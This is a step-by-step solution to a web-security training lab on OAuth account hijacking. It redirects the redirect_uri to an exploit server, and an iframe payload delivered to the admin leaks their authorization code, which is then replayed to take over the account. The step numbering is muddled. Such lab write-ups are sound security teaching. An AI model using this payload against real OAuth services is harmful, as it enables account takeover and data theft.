# Lab: OAuth Account Hijacking via redirect_uri


This lab uses an OAuth service to allow users to log in with their social media account. A misconfiguration by the OAuth provider makes it possible for an attacker to steal authorization codes associated with other users' accounts.

To solve the lab, steal an authorization code associated with the admin user, then use it to access their account and delete the user carlos.

The admin user will open anything you send from the exploit server and they always have an active session with the OAuth service.

You can log in with your own social media account using the following credentials: wiener:peter.





// solution:


## Step 1

Open the lab.

---

## Step 2

Click **My Account**.

---

## Step 3

Login using **OAuth (Social Login)** with:

```
Username: wiener
Password: peter
```

---

## Step 4

After login, you will return to the blog website.

---

## Step 5

Click **Log out**.

---

## Step 6

Click **My Account** again and choose **Log in with Social Media**.

Since your OAuth session is still active, you will be logged in instantly.

---

## Step 7

Go to **Burp → HTTP History**.

Find the latest request:

```
GET /auth?client_id=LAB-CLIENT-ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback&response_type=code&scope=openid%20profile%20email
```

This is the OAuth authorization request.

---

## Step 8

Right-click this request.

Select:

```
Send to Repeater
```

---

## Step 9

In Repeater, find the parameter:

```
redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback
```

---

## Step 10

Replace it with your **Exploit Server URL**.

Example:

```
redirect_uri=https://YOUR-EXPLOIT-ID.exploit-server.net&response_type=code&scope=openid%20profile%20email
```

Leave all other parameters unchanged.

---

## Step 11

Click **Send**.

---

## Step 12

Click or copy **Follow Redirect** in the response and open in new tab.

The OAuth server will now redirect to your exploit server.


---

## Step 13

Go to **Exploit Server → Body**.

Create this payload:

```html
<iframe src="https://oauth-LAB-ID.oauth-server.net/auth?client_id=LAB-CLIENT-ID&redirect_uri=https://YOUR-EXPLOIT-ID.exploit-server.net&response_type=code&scope=openid%20profile%20email"></iframe>
```
Now Store → View Exploit → Deliver to Victim.

---

---

## Step 14

Click **View Exploit**.

The iframe should load successfully.

---

## Step 15

Go back to **Access Log**.

You should see another request containing a `code=` parameter.

This confirms the exploit works.

---

## Step 16

Click **Deliver exploit to victim**.

---

## Step 17

After a few seconds, open **Access Log** again.

Copy the victim's authorization code.

Example:

```
code=GWSK52e_tlexi6TVCp0w9yBfOoW-NDNQRdNNxJkfWKr
```

---

## Step 18

Log out of the blog website.

---

## Step 21

Open this URL in your browser:

```
https://YOUR-LAB-ID.web-security-academy.net/oauth-callback?code=VICTIM_CODE
```

Replace `VICTIM_CODE` with the code you copied.

---

## Step 19

The OAuth flow completes automatically.

You are now logged in as the **Administrator**.

---

## Step 20

Open the **Admin Panel**.

---

## Step 21

Delete the user:

```
carlos
```

---

## Step 22

The lab is solved. ✅
